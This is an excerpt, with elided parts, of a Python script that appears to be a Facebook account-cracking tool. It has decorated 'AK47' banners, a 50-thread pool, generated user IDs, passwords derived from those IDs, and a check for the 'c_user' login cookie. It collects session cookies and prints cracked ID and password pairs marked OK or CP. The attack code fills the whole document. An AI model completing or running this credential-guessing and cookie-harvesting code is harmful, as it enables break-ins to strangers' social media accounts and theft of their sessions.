...
\033[1;31m\033[1;37m LIFE STATUS\x1b[1;97m : \033[1;37m      AK47🙂
\033[1;37m------------------------\033[1;37m------------------------ """       
loop = 0
oks = []
cps = []
...
def i():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print('\033[1;37m SIR BALII JUTT +SABA DON ITNA W8  😂')
        print(47*"-")
        for love in user:
            pwx = [love[1:]]
            uid = code+love
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(' \033[1;32m[AK47-OK 🇵🇰]  ' +cid+ ' | ' +ps+  '\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(' \x1b[38;5;208m[AK47-CP 🇮🇳]  ' +cid+ ' | ' +ps+           '  \33[0;97m')
